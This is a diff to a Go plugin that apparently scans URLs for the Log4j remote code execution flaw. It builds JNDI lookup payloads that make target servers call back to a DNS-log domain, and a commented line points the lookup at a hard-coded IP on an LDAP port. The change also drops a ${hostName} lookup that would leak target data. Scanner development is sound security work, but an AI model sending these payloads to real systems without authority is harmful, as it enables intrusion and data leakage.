@@ -55,7 +55,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	_ = meta
 	randString := utils.RandStringRunes(6)
 	// count := 0
-	randStr := domain + ".${:-" + randString + "}.${hostName}"
+	randStr := domain + ".${:-" + randString + "}"
 	trueWord := domain + "." + randString
 	// randStr = "nowqq" + utils.RandStringRunes(6)
 	fmt.Println(randStr)
@@ -104,7 +104,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	for _, payload := range payloads {
 		// fullPayload := payload
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
-		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/hwojz0}", payload)
+		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/i0rhku}", payload)
 		for _, reqPath := range reqPaths {
 			for _, method := range methods {
 				var request *http.Request
